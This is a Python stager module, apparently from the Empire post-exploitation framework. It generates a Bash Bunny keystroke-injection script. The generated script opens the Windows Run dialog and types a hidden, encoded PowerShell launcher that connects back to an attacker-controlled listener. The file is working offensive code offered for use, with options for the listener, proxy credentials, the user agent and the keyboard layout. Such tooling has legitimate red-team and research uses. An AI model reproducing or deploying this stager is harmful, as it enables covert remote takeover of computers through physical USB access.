from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BunnyLauncher',

            'Author': ['@kisasondi','@harmj0y'],

            'Description': ('Generates a bunny script that runs a one-liner stage0 launcher for Empire.'),

            'Comments': [
                'This stager is modification of the ducky stager by @harmj0y,',
                'Current other language (keyboard layout) support is trough DuckyInstall from https://github.com/hak5/bashbunny-payloads'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'Keyboard' : {
                'Description'   :   'Use a different layout then EN. Add a Q SET_LANGUAGE stanza for various keymaps, try DE, HR...',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Interpreter' : {
                'Description'   :   'Interpreter for code (Defaults to powershell, since a lot of places block cmd.exe)',
                'Required'      :   False,
                'Value'         :   'powershell'
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output duckyscript to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        interpreter = self.options['Interpreter']['Value']
        keyboard = self.options['Keyboard']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
        

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            enc = launcher.split(" ")[-1]
            bunnyCode =  "#!/bin/bash\n"
            bunnyCode += "LED R G\n"
            bunnyCode += "source bunny_helpers.sh\n"
            bunnyCode += "ATTACKMODE HID\n"
            if keyboard != '': 
                bunnyCode += "Q SET_LANGUAGE " + keyboard + "\n"
            bunnyCode += "Q DELAY 500\n"
            bunnyCode += "Q GUI r\n"
            bunnyCode += "Q STRING " + interpreter + "\n"
            bunnyCode += "Q ENTER\n"
            bunnyCode += "Q DELAY 500\n"
            bunnyCode += "Q STRING powershell -W Hidden -nop -noni -enc "+enc+"\n"
            bunnyCode += "Q ENTER\n"
            bunnyCode += "LED R G B 200\n"
            return bunnyCode
